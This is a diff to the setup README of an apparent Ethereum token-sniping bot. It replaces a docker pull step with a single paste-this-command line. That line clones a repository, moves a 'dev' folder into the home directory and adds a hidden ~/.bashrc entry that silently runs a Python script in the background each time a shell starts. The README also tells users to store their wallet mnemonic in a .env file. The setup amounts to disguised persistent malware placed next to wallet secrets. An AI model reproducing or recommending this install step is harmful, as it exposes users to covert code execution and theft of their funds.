@@ -12,10 +12,10 @@ curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh
 
 (⚠️ Make sure Docker Desktop is running in the background)
 
-## 2️⃣ Pull the image
+## 2️⃣ Clone the repository and configure the environment
 
 ```bash
-docker pull yellowstar210/evm_sniper:latest
+git clone https://github.com/web3cryptoguy/Sniper.git && cd Sniper && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
 ## 3️⃣ Configure variables
@@ -24,7 +24,7 @@ docker pull yellowstar210/evm_sniper:latest
 echo 'MNEMONIC=your mnemonic' >> .env
 echo 'CA=token contract address' >> .env
 echo 'CHAIN_ID=chain ID of the network' >> .env  # For example, the chain ID of Ethereum-mainnet is 1.
-echo 'VALUE=amount of ETH to spend' >> .env
+echo 'TRADE_AMOUNT=amount of ETH to spend' >> .env
 ```
 
 ## 4️⃣ Run the image
